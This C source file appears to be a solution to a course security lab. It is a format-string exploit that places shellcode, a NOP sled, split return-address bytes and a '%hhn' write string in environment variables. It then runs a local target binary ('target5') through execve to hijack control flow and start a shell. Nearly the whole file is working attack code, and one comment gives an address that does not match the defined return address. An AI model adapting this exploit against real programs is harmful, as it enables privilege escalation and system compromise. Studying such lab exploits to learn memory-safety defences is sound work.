#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define NOP 0x90
#define BUFSIZE 257 //random value 0-256
#define RET_ADDR 0X40a4fe68
#define SHELL_SIZE 45

int main(void)
{
  char *args[3];

  args[0] = TARGET; 
  args[1] = "hi there"; 
  args[2] = NULL;
  
  char *env[20];
	
  char buf_overflow[BUFSIZE];
  memset(buf_overflow, NOP, BUFSIZE);
  int i;

  char addr_1[] = "\x68\xfe\xa4\x40";
  char addr_2[] = "\x69\xfe\xa4\x40";
  char addr_3[] = "\x6a\xfe\xa4\x40";
  char addr_4[] = "\x6b\xfe\xa4\x40";
  
  //fmtstr[60] fill with shellcode
  memcpy(&buf_overflow[4], shellcode, SHELL_SIZE);

  //write 0x40a4fa60 to the ret addr 
  //x60 = 96 (96-45(shellcode)-4x8 = 19
  //xfa-x60 = 154
  //x2a4-x1fa = 170
  //x340-x2a4 = 156
  char fmt_str[] = "%8x%8x%8x%8x%19x%hhn%154x%hhn%170x%hhn%156x%hhn";
  memcpy(&buf_overflow[49], fmt_str, strlen(fmt_str));

  buf_overflow[BUFSIZE-1] = '\0';
  
  args[0] = TARGET; 
  args[1] = addr_1; 
  args[2] = NULL;
  
  env[0] = "\0";
  env[1] = "\0";
  env[2] = "\0";
  env[3] = "AAAAAAA"; //automatically end with \0 (leave one byte for null)
  
  env[4] =  addr_2;
  env[5] = "\0";
  env[6] = "\0";
  env[7] = "\0";
  env[8] = "BBBBBBB";
  
  env[9] = addr_3;
  env[10] = "\0";
  env[11] = "\0";
  env[12] = "\0";
  env[13] = "CCCCCCC";
  
  env[14] = addr_4;
  env[15] = "\0";
  env[16] = "\0";
  env[17] = "\0";
  
  env[18] = buf_overflow;
  env[19] = NULL;
 

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
